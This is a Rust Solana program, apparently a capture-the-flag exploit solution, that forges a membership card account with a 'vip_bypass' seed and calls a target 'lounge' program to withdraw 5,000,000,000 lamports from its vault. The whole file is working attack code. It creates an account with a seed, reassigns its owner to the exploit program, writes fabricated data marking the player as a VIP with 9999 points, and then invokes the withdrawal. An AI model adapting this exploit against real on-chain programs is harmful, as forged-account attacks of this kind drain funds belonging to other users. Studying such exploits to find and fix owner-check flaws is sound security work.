use borsh::{BorshDeserialize, BorshSerialize};
use solana_program::{
    account_info::{next_account_info, AccountInfo},
    entrypoint,
    entrypoint::ProgramResult,
    instruction::{AccountMeta, Instruction},
    program::invoke,
    pubkey::Pubkey,
    system_instruction,
    rent::Rent,
    sysvar::Sysvar,
};

entrypoint!(process_instruction);

#[derive(BorshSerialize, BorshDeserialize)]
pub struct MemberCard {
    pub member: Pubkey,
    pub is_vip: bool,
    pub points: u64,
}

#[derive(BorshSerialize)]
pub enum LoungeInstruction {
    Withdraw { amount: u64 },
}

pub fn process_instruction(
    program_id: &Pubkey,
    accounts: &[AccountInfo],
    _instruction_data: &[u8],
) -> ProgramResult {
    let account_info_iter = &mut accounts.iter();
    
    let player = next_account_info(account_info_iter)?;
    let vault = next_account_info(account_info_iter)?;
    let target_program = next_account_info(account_info_iter)?;
    let system_program = next_account_info(account_info_iter)?;
    let fake_card = next_account_info(account_info_iter)?;

    let seed = "vip_bypass";
    let space = 41;
    let rent = Rent::get()?;
    let lamports = rent.minimum_balance(space);

    // 1. Create Account with Seed (Owner = System Program)
    if fake_card.data_len() == 0 {
        invoke(
            &system_instruction::create_account_with_seed(
                player.key,
                fake_card.key,
                player.key,
                seed,
                lamports,
                space as u64,
                system_program.key,
            ),
            &[player.clone(), fake_card.clone(), system_program.clone()],
        )?;

        // 2. Assign Owner to Exploit Program
        invoke(
            &system_instruction::assign_with_seed(
                fake_card.key,
                player.key,
                seed,
                program_id,
            ),
            &[fake_card.clone(), player.clone(), system_program.clone()],
        )?;
    }

    // 3. Write Fake Data
    let mut card_data = MemberCard {
        member: *player.key,
        is_vip: true,
        points: 9999,
    };
    
    // Serialize data (Logic borsh 0.9)
    card_data.serialize(&mut &mut (*fake_card.data).borrow_mut()[..])?;

    // 4. Withdraw
    let withdraw_ix = Instruction {
        program_id: *target_program.key,
        accounts: vec![
            AccountMeta::new(*vault.key, false),
            AccountMeta::new_readonly(*fake_card.key, false),
            AccountMeta::new(*player.key, true),
        ],
        data: borsh::to_vec(&LoungeInstruction::Withdraw { amount: 5_000_000_000 }).unwrap(),
    };

    invoke(
        &withdraw_ix,
        &[vault.clone(), fake_card.clone(), player.clone(), target_program.clone()],
    )?;

    Ok(())
}